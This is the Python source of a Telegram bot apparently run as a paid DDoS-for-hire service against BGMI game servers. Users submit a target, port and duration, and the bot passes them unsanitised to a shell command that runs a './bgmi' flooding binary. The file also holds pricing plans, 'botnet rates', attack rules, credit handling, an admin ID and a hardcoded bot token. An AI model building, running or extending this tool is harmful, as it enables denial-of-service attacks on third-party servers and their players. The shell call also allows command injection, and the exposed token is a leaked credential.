#bgmiddoserpython

import telebot
import subprocess
import datetime
import os

from config import FREE_USER_FILE, initial_free_credits

from keep_alive import keep_alive

keep_alive()
# Insert your Telegram bot token here

bot = telebot.TeleBot('7056532346:AAHMhBTO8DIU1FDtZh0mS-zaQ5tcaJ2UN7k')

# Admin user IDs
admin_id = {"1055000829"}


# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

allowed_user_ids = []  # This will be read from the file later

free_user_credits = {}  # Dictionary to store free users and their remaining credits


# Read allowed user IDs from file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Read free users and their credits from file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                user_id, credits = line.split()
                free_user_credits[user_id] = int(credits)
    except FileNotFoundError:
        print("⚠️ Free users file not found. No free users added yet.")
        pass

# Save free users and their credits to the file
def save_free_users():
    with open(FREE_USER_FILE, "w") as file:
        for user_id, credits in free_user_credits.items():
            file.write(f"{user_id} {credits}\n")

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                response = "🧹 Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                
                # Notify the user who has been added
                try:
                    bot.send_message(user_to_add, "🎉 You have been successfully added to the bot! Welcome!")
                except Exception as e:
                    bot.reply_to(message, f"⚠️ Could not notify user {user_to_add}. Error: {str(e)}")
                
                response = f"✅ User {user_to_add} Added Successfully 👍."
            else:
                response = "🤦‍♂️ User already exists."
        else:
            response = "😒 Please specify a user ID to add."
    else:
        response = "❌ ONLY OWNER CAN USE."
    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                
                # Notify the user who has been removed
                try:
                    bot.send_message(user_to_remove, "⚠️ You have been removed from the bot. You no longer have access to the services.")
                except Exception as e:
                    bot.reply_to(message, f"⚠️ Could not notify user {user_to_remove}. Error: {str(e)}")
                
                response = f"✅ User {user_to_remove} removed successfully 👍."
            else:
                response = "❌ User not found in the list."
        else:
            response = "Please specify a user ID to remove. ✅ Usage: /remove <userid>"
    else:
        response = "❌ ONLY OWNER CAN USE."
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ."
    else:
        response = "🚫 ONLY OWNER CAN USE."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found "
        except FileNotFoundError:
            response = "No data found "
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.reply_to(message, response)
        else:
            response = "No data found "
            bot.reply_to(message, response)
    else:
        response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
# Save free users and their credits back to the file
def save_free_users():
    with open(FREE_USER_FILE, "w") as file:
        for user_id, credits in free_user_credits.items():
            file.write(f"{user_id} {credits}\n")

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    # Check if the user is an admin (admins have no restrictions)
    if user_id in admin_id:
        pass  # Admins can run without restrictions
    
    # Check if the user is an allowed free user and has credits
    elif user_id in free_user_credits:
        if free_user_credits[user_id] > 0:
            free_user_credits[user_id] -= 1  # Deduct 1 credit per attack
            
            # Notify the user of remaining credits
            bot.reply_to(message, f"✅ You have successfully used 1 credit. You now have {free_user_credits[user_id]} credits remaining.")
            
            # Check if credits are exhausted, remove the user if they are
            if free_user_credits[user_id] == 0:
                del free_user_credits[user_id]
                save_free_users()  # Save updated file after removal
                bot.reply_to(message, "⛔  credits are exhausted and you have been removed as a free user. Please upgrade your plan.")
                return  # Exit the function, as the user has no more credits

            save_free_users()  # Save updated credits to the file after deduction
        else:
            bot.reply_to(message, "⛔ You are out of credits! You have been removed as a free user. Please upgrade your plan. To check plans , run /plan .")
            del free_user_credits[user_id]
            save_free_users()  # Save the updated list to the file
            return  # Exit function if no credits
    
    # Check if the user is in the allowed users list
    elif user_id not in allowed_user_ids:
        bot.reply_to(message, "🚫You are not authorized to use this command. Get access from the owner @TancantDac or use /plan to check plan or free user details.")
        return
    
    # Handle cooldowns (non-admins only)
    if user_id not in admin_id:
        # Check if user is on cooldown
        if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
            bot.reply_to(message, "You are on cooldown. Please wait 5 minutes before running the /bgmi command again.")
            return
        
        # Update cooldown
        bgmi_cooldown[user_id] = datetime.datetime.now()
    
    # Split the command into target, port, and time
    command = message.text.split()
    if len(command) == 4:  # Check if target, port, and time are provided
        target = command[1]
        port = int(command[2])
        time = int(command[3])
        
        # Time validation
        if time > 181:
            bot.reply_to(message, "⚠️ Time interval must be less than 180.")
            return
        
        # Log and process the attack
        record_command_logs(user_id, '/bgmi', target, port, time)
        log_command(user_id, target, port, time)
        start_attack_reply(message, target, port, time)  # Notify user
        
        # Run the BGMI attack command
        full_command = f"./bgmi {target} {port} {time} 200"
        subprocess.run(full_command, shell=True)
        bot.reply_to(message, f"🎯BGMI Attack Finished. Target: {target}, Port: {port}, Time: {time}s.")
    else:
        bot.reply_to(message, "✅ Usage: /bgmi <target> <port> <time> (time should be less than 180).")

# Command to add a free user
@bot.message_handler(commands=['addfreeuser'])
def add_free_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in free_user_credits:
                free_user_credits[user_to_add] = initial_free_credits  # Give initial free credits
                save_free_users()  # Save the updated list to the file

                # Notify the free user who has been added
                try:
                    bot.send_message(user_to_add, f"🎉 You have been added as a free user with {initial_free_credits} credits! Enjoy your free trial.")
                except Exception as e:
                    bot.reply_to(message, f"⚠️ Could not notify free user {user_to_add}. Error: {str(e)}")
                
                response = f"✅ Free user {user_to_add} added successfully with {initial_free_credits} credits."
            else:
                response = "🤦‍♂️ User already exists in free users."
        else:
            response = "😒 Please specify a user ID to add."
    else:
        response = "❌ ONLY OWNER CAN USE."
    bot.reply_to(message, response)

@bot.message_handler(commands=['removefreeuser'])
def remove_free_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in free_user_credits:
                del free_user_credits[user_to_remove]
                save_free_users()  # Save the updated list to the file

                # Notify the free user who has been removed
                try:
                    bot.send_message(user_to_remove, "⚠️ You have been removed as a free user. You no longer have access to the free trial.")
                except Exception as e:
                    bot.reply_to(message, f"⚠️ Could not notify free user {user_to_remove}. Error: {str(e)}")
                
                response = f"✅ Free user {user_to_remove} removed successfully."
            else:
                response = f"❌ User {user_to_remove} not found in free users."
        else:
            response = "😒 Please specify a user ID to remove."
    else:
        response = "❌ ONLY OWNER CAN USE."
    bot.reply_to(message, response)


free_user_credits = {}  # Dictionary to store free users and their remaining credits

# Read free users and their credits
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():
                    user_id, credits = line.split()
                    free_user_credits[user_id] = int(credits)
    except FileNotFoundError:
        pass

# Save free users and their credits back to the file
def save_free_users():
    with open(FREE_USER_FILE, "w") as file:
        for user_id, credits in free_user_credits.items():
            file.write(f"{user_id} {credits}\n")


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "📄 Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "🔍 No Command Logs Found For You."
        except FileNotFoundError:
            response = "🔍 No command logs found."
    else:
        response = "❌ You Are Not Authorized To Use This Command."
    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
💥 /id : Get your chat id
💥 /bgmi : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.
💥/mycredits : check your free trail attacks

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    # Get user details
    user_id = str(message.chat.id)
    username = message.from_user.username if message.from_user.username else "Unknown"
    first_name = message.from_user.first_name if message.from_user.first_name else "Unknown"
    last_name = message.from_user.last_name if message.from_user.last_name else "Unknown"
    
    # Welcome message
    response = f'''👋🏻 Welcome to Your Home, {first_name}! Feel free to explore.
🤖 Try running this command: /help 
'''
    bot.reply_to(message, response)
    
    # Store user data in a file or database
    with open("users_data.txt", "a") as file:
        file.write(f"User ID: {user_id}, Username: {username}, Name: {first_name} {last_name}\n")
    
    # Optionally notify the bot owner/admin when a new user joins
    admin_id = '1055000829'  # Replace with your Telegram ID
    bot.send_message(admin_id, f"🚨 New User Started the Bot!\n\nUsername: {username}\nName: {first_name} {last_name}\nUser ID: {user_id}")



@bot.message_handler(commands=['sendcredits'])
def send_free_credits(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_credit = command[1]
            credits_to_send = int(command[2])
            
            if user_to_credit in free_user_credits:
                free_user_credits[user_to_credit] += credits_to_send
            else:
                free_user_credits[user_to_credit] = credits_to_send
            
            # Save updated free user credits to the file
            save_free_users()

            # Notify the user that they have received free credits
            try:
                bot.send_message(user_to_credit, f"🎉 You've received {credits_to_send} promotional credits! Enjoy!")
            except Exception as e:
                bot.reply_to(message, f"⚠️ Could not notify user {user_to_credit}. Error: {str(e)}")
            
            response = f"✅ {credits_to_send} credits successfully sent to {user_to_credit}."
        else:
            response = "😒 Usage: /sendcredits <user_id> <amount>"
    else:
        response = "❌ ONLY OWNER CAN USE."
    bot.reply_to(message, response)


@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, here are the plans available:

Free Trial 🌟:
-> Access Time: 60 Minutes (1 hour)

VIP 🌟:
-> Attack Time: 180 Seconds (3 minutes)
-> Cooldown: 5 Minutes
-> Concurrent Attacks: 3

Prices 💸:
Day: 150 Rs 
Week: 900 Rs
Month: 1600 Rs 
[Special Offer: Get 100 Rs off if you refer a friend and they buy a plan]
To Buy Any Plan DM @TancantDac
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /addfreeuser <userId> : Add a free User.
💥 /removefreeuser <userid> Remove a free User.

💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.

Dont use these command if you are a costumer 
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)




#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
